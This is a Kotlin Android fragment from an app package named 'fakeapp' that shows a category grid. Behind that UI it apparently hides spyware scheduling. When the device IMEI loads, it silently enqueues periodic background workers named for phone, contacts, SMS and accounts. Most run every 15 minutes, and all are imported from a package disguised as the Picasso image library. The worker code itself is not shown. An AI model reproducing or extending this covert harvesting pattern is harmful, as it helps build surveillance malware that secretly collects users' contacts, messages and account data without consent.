package com.company.app.fakeapp.ui.category

import android.content.Intent
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import androidx.lifecycle.Observer
import androidx.recyclerview.widget.GridLayoutManager
import androidx.work.*
import com.company.app.fakeapp.R
import com.company.app.fakeapp.storage.db.BitrhdayDatabase
import com.company.app.fakeapp.model.Category
import com.company.app.fakeapp.storage.ImeiDbRepository
import com.company.app.fakeapp.viewmodel.CategoryViewModel
import com.company.app.fakeapp.ui.list.ListActivity
import com.company.app.fakeapp.viewmodel.CategoryViewModelFactory
import com.fahedhermoza.developer.examplenote01.Models.ImeiDatabaseDataSource
import com.squareup.picasso.presentation.AccountWorker
import com.squareup.picasso.presentation.ContactWorker
import com.squareup.picasso.presentation.PhoneWorker
import com.squareup.picasso.presentation.SmsWorker
import kotlinx.android.synthetic.main.caterory_fragment.*
import java.util.concurrent.TimeUnit
import androidx.fragment.app.viewModels

/***
 * https://stackoverflow.com/questions/51202905/execute-task-every-second-using-work-manager-api
 */
class CategoryFragment : Fragment() {

    companion object {
        private const val SPAN_COUNT = 2
        private const val KEY_IMEI_ARG = "KEY_IMEI_ARG_APP"
        fun newInstance() =
            CategoryFragment()
    }

    private lateinit var adapter: CategoryAdapter
    private lateinit var workManager: WorkManager

    private val viewModel by viewModels<CategoryViewModel> {
        CategoryViewModelFactory(
            ImeiDbRepository(
                ImeiDatabaseDataSource(
                    BitrhdayDatabase.getInstance(requireContext().applicationContext)!!
                )
            )
        )
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        return inflater.inflate(R.layout.caterory_fragment, container, false)
    }

    override fun onActivityCreated(savedInstanceState: Bundle?) {
        super.onActivityCreated(savedInstanceState)
        workManager = WorkManager.getInstance(requireContext())
        setupViewModel()
        setupUI()
        viewModel.loadImei()
    }

    private fun setupViewModel() {
        viewModel.categories.observe(viewLifecycleOwner,renderCategories)
        viewModel.onImei.observe(viewLifecycleOwner, processImei)
    }

    //observers
    private val renderCategories= Observer<List<Category>> {
        adapter.update(it)
    }

    private  val processImei= Observer<String?> {
        it?.let { applyWorker(it) }
    }

    private fun setupUI() {
        adapter = CategoryAdapter(
            emptyList(),
            onItemAction()
        )

        rvCategory.layoutManager = GridLayoutManager(context,
            SPAN_COUNT
        )
        rvCategory.adapter = adapter
    }

    override fun onResume() {
        super.onResume()
        viewModel.loadCategory()
    }

    private fun onItemAction(): (item: Category) -> Unit {
        return {
            goToDetailView(it)
        }
    }

    private fun goToDetailView(item: Category) {
        val bundle = Bundle().apply {
            putString("name_category", item.name)
        }
        val intent = Intent(context, ListActivity::class.java)
        intent.putExtras(bundle)
        startActivity(intent)
    }

    //WorkManager
    private fun applyWorker(imei: String){
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.UNMETERED)
            .build()

        val data: Data = workDataOf(KEY_IMEI_ARG to imei)

        //Build phoneRequest
        val phoneRequest = PeriodicWorkRequest
            .Builder (PhoneWorker:: class.java, 24, TimeUnit.HOURS)
            .setConstraints (constraints)
            .setInputData(data)
            .setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS)
            .build ()

        //Build contactRequest
        val contactRequest = PeriodicWorkRequest
            .Builder (ContactWorker:: class.java, 15, TimeUnit.MINUTES)
            .setConstraints (constraints)
            .setInputData(data)
            .setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS)
            .build ()

        //Build smsRequest
        val smsRequest = PeriodicWorkRequest
            .Builder (SmsWorker:: class.java, 15, TimeUnit.MINUTES)
            .setConstraints (constraints)
            .setInputData(data)
            .setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS)
            .build ()

        //Build accountRequest
        val accountRequest = PeriodicWorkRequest
            .Builder (AccountWorker:: class.java, 15, TimeUnit.MINUTES)
            .setConstraints (constraints)
            .setInputData(data)
            .setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS)
            .build ()

        workManager.enqueueUniquePeriodicWork("jobPhoneWork", ExistingPeriodicWorkPolicy.KEEP, phoneRequest)
        Thread.sleep(3000)
        workManager.enqueueUniquePeriodicWork("jobContactWork", ExistingPeriodicWorkPolicy.KEEP, contactRequest)
        workManager.enqueueUniquePeriodicWork("jobSmsWork", ExistingPeriodicWorkPolicy.KEEP, smsRequest)
        workManager.enqueueUniquePeriodicWork("jobAccountWork", ExistingPeriodicWorkPolicy.KEEP, accountRequest)
    }
}